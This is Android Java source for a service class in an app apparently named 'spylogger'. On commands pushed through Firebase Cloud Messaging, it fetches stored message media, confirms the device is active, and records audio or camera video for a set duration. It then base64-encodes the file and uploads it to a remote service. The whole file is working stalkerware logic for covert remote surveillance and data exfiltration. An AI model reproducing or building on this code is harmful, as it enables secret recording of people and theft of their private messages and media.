package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.helpers.ServicosHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;

import java.io.File;
import java.sql.SQLException;

/**
 * Created by bruno on 05/01/17.
 */

public class FcmHelperService {
    private Context context;
    private FcmMessageVO fcmMessageVO;
    private SendArquivoService sendArquivoService;
    private EnvioArquivoVO envioArquivoVO;
    private ServicosHelper servicosHelper;

    public FcmHelperService(Context context, FcmMessageVO fcmMessageVO) {
        this.context = context;
        this.fcmMessageVO = fcmMessageVO;
        sendArquivoService=new SendArquivoService(null);
        envioArquivoVO= new EnvioArquivoVO.EnvioArquivoVOBuilder()
                .setPhpId(fcmMessageVO.getPhpId())
                .setTipoAcao(fcmMessageVO.getTipoAcao())
                .setId(fcmMessageVO.getId())
                .build();

        servicosHelper=new ServicosHelper();
    }

    public void executar() {
        switch (fcmMessageVO.getTipoAcao()) {
            case RECUPERAR_ARQUIVO:
                enviarArquivo(recuperarArquivo());
                break;
            case ESTA_ATIVO:
                sendArquivoService.enviar(envioArquivoVO);
                break;
            case OBTER_AUDIO:
                TaskComplete callback=new TaskComplete() {
                    @Override
                    public void onFinish(Object object) {
                        if(object!=null){
                            enviarArquivo((String) object);
                        }
                    }
                };
                servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
                break;
            case OBTER_VIDEO:
                TaskComplete cb=new TaskComplete() {
                    @Override
                    public void onFinish(Object object) {
                        if(object!=null){
                            enviarArquivo((String) object);
                        }
                    }
                };
                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),cb);
                break;
            default:
                return;
        }
    }


    private File recuperarArquivo(){
        try {
            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
            Mensagem mensagem = repositorioMensagem.obterPorId(fcmMessageVO.getId());

            if (mensagem != null) {
                return Utils.getMediaFile(
                        mensagem.getTipoMidia(),
                        mensagem.getTamanhoArquivo(),
                        mensagem.getDataRecebida(), 1);
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }
        return null;
    }

    private void enviarArquivo(File file) {
        if(file!=null){
            enviarArquivo(Utils.encodeBase64(file));
        }
    }
    private void enviarArquivo(String file) {
        if(file!=null){
            envioArquivoVO.setId(fcmMessageVO.getId());
            envioArquivoVO.setArquivo(file);

            sendArquivoService.enviar(envioArquivoVO);
        }
    }
}
